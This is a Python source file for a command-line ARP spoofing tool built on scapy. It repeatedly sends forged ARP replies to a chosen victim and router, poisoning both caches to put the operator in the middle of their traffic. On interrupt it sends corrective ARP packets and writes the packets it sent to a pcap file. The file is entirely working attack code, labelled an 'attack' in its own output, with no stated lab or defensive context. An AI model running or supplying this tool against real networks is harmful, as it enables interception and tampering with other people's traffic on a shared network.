import time
from dataclasses import dataclass, field

import typer
from scapy.all import ARP, send, wrpcap
from scapy.packet import Packet


@dataclass
class ArpSpoofer:
    target_ip: str
    target_mac: str
    router_ip: str
    router_mac: str
    capture_file: str = "capture.pcap"
    interval: float = 2.0
    _packets: list[Packet] = field(default_factory=list, init=False)

    def __post_init__(self):
        self._arp_victim = ARP(
            op=2, psrc=self.router_ip, pdst=self.target_ip, hwdst=self.target_mac
        )
        self._arp_router = ARP(
            op=2, psrc=self.target_ip, pdst=self.router_ip, hwdst=self.router_mac
        )
        self._arp_victim_restore = ARP(
            op=2,
            psrc=self.router_ip,
            hwsrc=self.router_mac,
            pdst=self.target_ip,
            hwdst=self.target_mac,
        )
        self._arp_router_restore = ARP(
            op=2,
            psrc=self.target_ip,
            hwsrc=self.target_mac,
            pdst=self.router_ip,
            hwdst=self.router_mac,
        )

    def _send(self, packet: Packet, count: int = 1) -> None:
        send(packet, verbose=False, count=count)
        self._packets.append(packet)

    def _restore(self) -> None:
        """Send correct ARP info to both victim and router to heal the network."""
        self._send(self._arp_victim_restore, count=5)
        self._send(self._arp_router_restore, count=5)
        typer.echo("[+] Network restored.")

    def _save_capture(self) -> None:
        """Save captured packets to a pcap file."""
        if not self._packets:
            typer.echo("[-] No packets to save.", err=True)
            return
        wrpcap(self.capture_file, self._packets)
        typer.echo(f"[+] Saved: {self.capture_file} ({len(self._packets)} packets)")

    def run(self) -> None:
        """Start the ARP spoofing loop."""
        typer.echo("[+] Sending spoofed ARP packets... Press Ctrl+C to stop.")
        try:
            while True:
                self._send(self._arp_victim)
                self._send(self._arp_router)
                time.sleep(self.interval)
        except KeyboardInterrupt:
            typer.echo("\n[!] Stopping attack...")
            self._restore()
            self._save_capture()
